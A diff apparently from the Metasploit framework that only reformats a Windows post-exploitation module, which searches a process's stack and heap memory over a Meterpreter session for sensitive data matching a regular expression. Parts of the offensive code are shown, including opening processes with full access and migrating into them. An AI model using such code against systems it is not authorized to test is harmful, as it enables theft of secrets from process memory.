@@ -5,30 +5,33 @@
 
 class MetasploitModule < Msf::Post
 
-  def initialize(info={})
-    super( update_info(info,
-      'Name'           => 'Windows Gather Process Memory Grep',
-      'Description'    => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather Process Memory Grep',
+        'Description' => %q{
           This module allows for searching the memory space of a process for potentially
-        sensitive data.  Please note: When the HEAP option is enabled, the module will have
-        to migrate to the process you are grepping, and will not migrate back automatically.
-        This means that if the user terminates the application after using this module, you
-        may lose your session.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         => ['bannedit'],
-      'Platform'       => ['win'],
-      'SessionTypes'   => ['meterpreter' ]
-    ))
+          sensitive data.  Please note: When the HEAP option is enabled, the module will have
+          to migrate to the process you are grepping, and will not migrate back automatically.
+          This means that if the user terminates the application after using this module, you
+          may lose your session.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => ['bannedit'],
+        'Platform' => ['win'],
+        'SessionTypes' => ['meterpreter' ]
+      )
+    )
     register_options([
-      OptString.new('PROCESS', [true,  'Name of the process to dump memory from', nil]),
-      OptRegexp.new('REGEX',   [true,  'Regular expression to search for with in memory', nil]),
-      OptBool.new('HEAP',      [false, 'Grep from heap', false])
+      OptString.new('PROCESS', [true, 'Name of the process to dump memory from', nil]),
+      OptRegexp.new('REGEX', [true, 'Regular expression to search for with in memory', nil]),
+      OptBool.new('HEAP', [false, 'Grep from heap', false])
     ])
   end
 
   def get_data_from_stack(target_pid)
-    proc  = client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
+    proc = client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
     stack = []
     begin
       threads = proc.thread.each_thread do |tid|
@@ -57,7 +60,7 @@ class MetasploitModule < Msf::Post
       print_status("Migrating into #{target_pid} to allow for dumping heap data")
       session.core.migrate(target_pid)
     end
-    proc  = client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
+    proc = client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
 
     railgun = session.railgun
     heap_cnt = railgun.kernel32.GetProcessHeaps(nil, nil)['return']
@@ -158,6 +161,5 @@ class MetasploitModule < Msf::Post
       dump_data(pid)
       print_line
     end
-
   end
 end
